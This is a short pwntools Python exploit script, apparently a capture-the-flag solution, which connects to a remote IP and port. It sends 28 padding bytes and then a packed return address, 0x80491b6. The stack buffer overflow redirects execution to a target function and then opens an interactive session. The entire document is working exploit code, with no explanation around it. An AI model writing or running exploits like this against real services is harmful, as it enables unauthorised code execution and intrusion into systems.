from pwn import *

p = remote('15.235.143.42', 47888)
#p =  process('./challenge')

buffer = 28
padding = b'A'*buffer
bruh_addr = p32(0x80491b6)
payload = padding + bruh_addr

p.sendline(payload)

p.interactive()
